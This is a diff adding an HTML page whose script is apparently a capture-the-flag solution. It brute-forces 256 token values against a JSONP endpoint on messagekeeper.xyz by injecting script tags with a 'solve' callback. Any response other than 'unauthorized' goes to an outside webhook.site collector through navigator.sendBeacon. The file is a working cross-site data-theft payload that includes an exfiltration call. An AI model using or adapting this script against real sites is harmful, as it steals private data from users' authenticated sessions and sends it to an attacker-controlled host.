@@ -1,0 +1,26 @@
+<body></body>
+<script>
+            //  a7681e90
+const prefix = 'fec502'
+const alph='0123456789abcdef'
+const tokens = [];
+
+function solve(user){
+    if(user.message != 'unauthorized'){
+        navigator.sendBeacon('https://webhook.site/4547bd74-2f79-474f-ab02-3f51e9665ac8', `flag=${user.message}`);
+        console.log(user);
+    }
+}
+
+for(let c1 of alph)
+    for(let c2 of alph)
+        tokens.push(prefix+c1+c2)
+
+for(let token of tokens){
+    var x = document.createElement('script');
+    x.src = 'https://messagekeeper.xyz/user?callback=solve&token='+token;
+    document.body.appendChild(x);
+}
+
+
+</script>
